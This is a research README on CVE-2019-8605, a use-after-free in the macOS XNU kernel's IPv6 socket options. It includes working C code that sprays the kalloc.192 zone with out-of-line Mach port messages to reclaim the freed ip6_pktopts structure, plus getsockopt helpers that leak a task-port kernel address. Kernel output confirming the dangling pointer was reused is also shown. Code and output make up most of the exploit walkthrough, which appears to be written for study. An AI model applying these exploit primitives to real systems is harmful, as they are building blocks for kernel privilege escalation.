# dangling_kptr_reuse (CVE-2019-8605)
## Environment
macOS 10.14.1 x86_64 ([net.siguza.hsp4.kext](https://github.com/Siguza/hsp4/tree/master) needed)

## Description and Proof-of-Concept
A brief intro to CVE-2019-8605,<br>
via the ip6_freepcbopts function, inp->in6p_outputopts is freed,<br>
but not set to NULL, leaving a dangling pointer that still points to freed memory.
```c
void in6_pcbdetach(struct inpcb *inp) {
    // ...
    if (!(so->so_flags & SOF_PCBCLEARING)) {
        struct ip_moptions *imo;
        struct ip6_moptions *im6o;

        inp->inp_vflag = 0;
        if (inp->in6p_options != NULL) {
            m_freem(inp->in6p_options);
            inp->in6p_options = NULL;   // <- correctly NULLed (GOOD)
        }
        ip6_freepcbopts(inp->in6p_outputopts);    // <- freed only, NOT NULLed (BAD)
        // release route for mapped addresses (IPv4 related resource release)
        ROUTE_RELEASE(&inp->in6p_route);
        if (inp->inp_options != NULL) {
            (void)m_free(inp->inp_options);        // <- correctly NULLed (GOOD)
            inp->inp_options = NULL;
        }
        // ...
    }
}
```
<br>
An OOL (out-of-line) message is important in XNU's IPC mechanism
<br>and has the characteristic that it can keep data allocated in kernel space until the message is received.

Using these OOL messages we can perform heap spray so that inp->in6p_outputopts points to sprayed kernel memory containing ipc_port structures.

Kernel allocations in XNU use zones. Each zone contains objects of a specific size/type. For example, the kalloc.32 zone contains objects up to 32 bytes. The dangling ip6_pktopts structure is 192 bytes, so it belongs to the kalloc.192 zone. 

Therefore, when doing heap spray, the count parameter should be `192/sizeof(uint64_t)`.
```c
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }

    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}
```

When heap spray runs, the kernel internally calls the following chain:
```c
mach_msg_overwrite_trap 
-> ipc_kmsg_copyin 
-> ipc_kmsg_copyin_body 
-> ipc_kmsg_copyin_ool_ports_descriptor 
-> ipc_object_copyin 
-> ipc_right_lookup_write 
-> ipc_entry_lookup
```

Because `ipc_entry_lookup` converts a name to the kernel-mode address of the Task Port entry, it results in 192-byte task ports being sprayed as shown below.
```c
ipc_entry_t
ipc_entry_lookup(
 ipc_space_t space,
 mach_port_name_t name)
{
 mach_port_index_t index;
 ipc_entry_t entry;
 index = MACH_PORT_INDEX(name);
 if (index < space->is_table_size) {
 entry = &space->is_table[index];
 ...
 }
 return entry;
}
```
- Sprayed task port kernel addresses:
```
[0xffffff80141cf040+0x000] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x010] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x020] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x030] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x040] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x050] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x060] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x070] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x080] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x090] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0a0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0b0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
```

The dangling 192-byte kernel structure looks like this:
```c
struct ip6_pktopts {
    struct mbuf         *ip6po_m;
    int                  ip6po_hlim;
    **struct in6_pktinfo  *ip6po_pktinfo;**
    struct ip6po_nhinfo  ip6po_nhinfo;
    struct ip6_hbh      *ip6po_hbh;
    struct ip6_dest     *ip6po_dest1;
    struct ip6po_rhinfo  ip6po_rhinfo;
    struct ip6_dest     *ip6po_dest2;
    **int                  ip6po_tclass;**
    **int                  ip6po_minmtu;**
    **int                  ip6po_prefer_tempaddr;**
    int                  ip6po_flags;
};
```
From userland, reading the `ip6po_minmtu` and `ip6po_prefer_tempaddr` fields allows leaking a task port.
```c
int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}
```

Thus, we examined how to reuse a dangling kernel pointer to leak data.

<b>This repository examines whether a dangling kernel pointer is actually reused.</b><br>
Using Siguzaâ€™s hsp4 kernel extension enables kernel read/write without a separate vulnerability.

Using a socket file descriptor, one can obtain the kernel address of the allocated 192-byte `ip6_pktopts` structure,<br>
and by accessing `ikmq_base` and `ikm_header` fields of OOL ports, one can get the `address` of the allocated `mach_msg_ool_ports_descriptor_t`.


If these addresses match, it means the dangling pointer was reused.
```
ret: 0x0, hsp4: 0xb03
kext_name: com.apple.kec.corecrypto
kext_addr_slid: 0xffffff7f890c7000
get_kbase ret: 0, kbase: 0xffffff8008200000, kslide: 0x8000000
[*] sock_fd: 3
[*] obtained dangling_kptr from socket_fd, 0xffffff80141cf040
[*] port_kaddr: 0xffffff801a1232a0
[*] ikmq_base: 0xffffff8019b96a00
[*] DANGLING KPTR REUSED!!!!!!
=============================
[0xffffff80141cf040+0x000] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x010] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x020] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x030] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x040] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x050] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x060] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x070] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x080] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x090] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0a0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0b0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
=============================
[*] our task port: 0xffffff801b68f150
```